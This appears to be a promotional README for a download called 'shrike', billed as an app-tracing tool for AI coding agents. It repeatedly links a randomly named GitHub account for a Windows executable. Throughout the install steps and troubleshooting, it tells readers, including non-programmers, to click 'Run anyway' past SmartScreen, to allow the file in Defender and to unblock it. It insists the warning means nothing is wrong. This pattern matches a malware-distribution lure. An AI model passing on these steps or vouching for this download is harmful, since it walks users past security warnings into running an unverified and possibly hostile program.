---
layout: "default"
title: "🔍 shrike - See Exactly What Your App Does"
description: "Record app sessions with end-to-end traces from UI clicks to server code, giving AI agents eyes to debug faster."
---
# 🔍 shrike - See Exactly What Your App Does

[![Download shrike](https://img.shields.io/badge/Download-shrike-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wonlostrecordnorthernness593/shrike)

**Visit this link to download the application.**

---

## 👋 What Is shrike?

shrike is a tool that lets you watch your application work in real time. You click something on screen, and shrike shows you the whole journey that click takes — through your code, through your database, and through every service your app talks to. It shows you the actual values moving around at each step, not abstract diagrams or guesses.

Think of it like a window into your app. Normally, when something goes wrong in software, you see an error message and have no idea where it came from. shrike removes that fog. You see the trip. You see the numbers. You see exactly where things went sideways.

shrike is also built for the age of AI assistants. If you use an AI coding agent — the kind that reads your project and helps you fix things — that agent can see the same information you see. So instead of describing a vague bug, your assistant looks at the real data path and fixes the real problem, not a guess.

You do not need to be a programmer to use shrike. If you can click a button and read a list of steps, you can use this tool.

---

## 🚀 Getting Started

Getting shrike onto your Windows computer takes just a few minutes. Follow these steps in order.

**Step 1 — Download the application**

Open this link in your web browser:

👉 https://github.com/wonlostrecordnorthernness593/shrike

**Visit this link to download the application.**

**Step 2 — Save the file**

Your browser will ask where to save the download. Choose your Downloads folder, or any folder you can easily find later. Remember the name of the file so you can locate it.

**Step 3 — Open the downloaded file**

Go to your Downloads folder. Find the file you just saved and double-click it to open it. If Windows shows a small blue message saying "Windows protected your PC," click "More info," then click "Run anyway." This is a standard Windows safety prompt that appears for many downloaded applications and does not mean anything is wrong.

**Step 4 — Let it open**

The application window will appear. The first launch may take a few seconds while it prepares itself. Be patient — do not click the window repeatedly. Once the main screen appears, you are ready to begin.

**Step 5 — Start exploring**

Follow the on-screen introduction. It will guide you through connecting your first application and making your first click-to-trace exploration.

That is the entire process. No command line. No configuration files. No technical setup.

---

## 🖱️ How It Works In Plain Language

Here is the simplest way to understand shrike.

Imagine your app is a restaurant. You order a meal (you click a button). The order goes to the kitchen (your code), the kitchen checks the pantry (your database), and the kitchen might call a supplier (an outside service). Food comes back to your table (the screen updates).

When something is wrong — the soup is cold, the order is wrong — most tools only tell you "something went wrong." shrike follows the order the whole way. It shows you:

- What you clicked
- Which part of the code received the click
- What data was read from the database, with the actual values
- Which outside services were contacted, and what they replied
- Where the chain broke, or where the value changed unexpectedly

Every step is displayed with real values, not placeholders. You see the actual order number, the actual ingredient list, the actual reply from the supplier.

---

## ✨ Main Things You Can Do

### 👀 Watch a Click Travel

Select any button, link, or field in your app. shrike records the entire path that action takes and displays it as an easy-to-read timeline. Each step is a card you can open to see the details.

### 🧮 See Real Values

No more "variable X equals unknown." shrike shows the concrete content at every stage — the actual text, the actual number, the actual record. This is what makes problems obvious instead of mysterious.

### 🗄️ Look Inside Your Database Activity

See which queries your app ran, what it asked for, and what came back. If your app is fetching the wrong record or fetching nothing, you will spot it immediately.

### 🔌 Follow Outside Services

If your app talks to payment processors, email senders, weather services, or anything else over the internet, shrike shows those conversations, including how long they took and what came back.

### 🤖 Share Everything With Your AI Assistant

Your AI coding assistant can read the exact same trace you are looking at. That means it does not have to guess. It sees the failing step and the real value, and it can propose or make the correct fix.

### 🧭 Works With Common Tools

shrike understands the widely used OpenTelemetry standard, so it can pick up information from many existing setups without special changes. It also provides an MCP interface, which is how AI agents plug in and read what you see.

---

## 🪟 Windows Notes

- shrike runs as a normal desktop application on Windows 10 and Windows 11.
- No separate database or server needs to be installed to try it out.
- If the app does not open the first time, close any error window, wait ten seconds, and double-click the file again.
- Keep the application in a folder you control. Moving it later is fine, but shortcuts you created may need to be recreated.
- If Windows Defender asks for permission the first time, allow the application so it can read activity from the apps you want to inspect.

---

## 🧑‍🤝‍🧑 Who This Is For

- **Curious non-developers** who want to understand why software misbehaves.
- **Product and support teams** who need to explain a bug precisely instead of "it just broke."
- **Beginner developers** learning how an application actually flows from click to database to response.
- **Experienced developers** who are tired of adding print statements and restarting.
- **Anyone using an AI coding agent** who wants that agent to work from facts instead of guesses.

---

## 🛠️ Troubleshooting

**The download did not start.** Return to the link above and click the main download button on the page. Check that your browser is not blocking downloads from that site.

**The file will not open.** Right-click the file, choose Properties, and look for an "Unblock" checkbox near the bottom. If you see it, tick it, click Apply, and try again.

**The window opens and closes immediately.** Restart your computer and try once more. A pending Windows update can interfere with first launch.

**I do not see any activity being captured.** Make sure the application you want to inspect is running, then use the connection screen inside shrike to point it at that application.

**Everything looks empty.** Confirm that the app you are inspecting is actually being used — click something inside it while shrike is watching.

---

## 📥 Download Again

[![Get shrike](https://img.shields.io/badge/Get%20shrike-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wonlostrecordnorthernness593/shrike)

**Visit this link to download the application.**

---

## 🌱 Open Source And Community

shrike is open source and welcomes newcomers. If you have never contributed to a software project before, this is a friendly place to start — issues are labeled for first-timers, and there are seasonal community events where people team up to improve the project. You can help by reporting something confusing, suggesting a clearer label, improving wording, or sharing how you used the tool.

The project is built with Node.js and Python components and packaged as a desktop application, with observability powered by OpenTelemetry and an MCP interface for AI agents.

---

## ❓ Frequently Asked Questions

**Do I need to know how to code?**
No. Reading a trace is like reading a receipt. The steps are listed in order with plain values.

**Does it change my app?**
It observes. It does not rewrite your application.

**Will my AI assistant really see the same thing?**
Yes. That is the point of the AI-native design — your agent reads the same trace and works from the same facts.

**Is it free?**
It is open source. Download it and use it.

**Can I use it on more than one app?**
Yes. Point it at whichever app you want to inspect, one at a time.

**Where do I get help?**
Use the link above to reach the project page, where you can open a question.

---

## 🏁 Start Now

1. Open https://github.com/wonlostrecordnorthernness593/shrike
2. **Visit this link to download the application.**
3. Double-click the downloaded file.
4. Click something in your app and watch the trip.

Keywords: ai-agents, claude-code, debugger, developer-tools, electron, first-timers-friendly, good-first-issue, hacktoberfest, hacktoberfest2026, mcp, nodejs, observability, open-source, opentelemetry, python, vibe-coding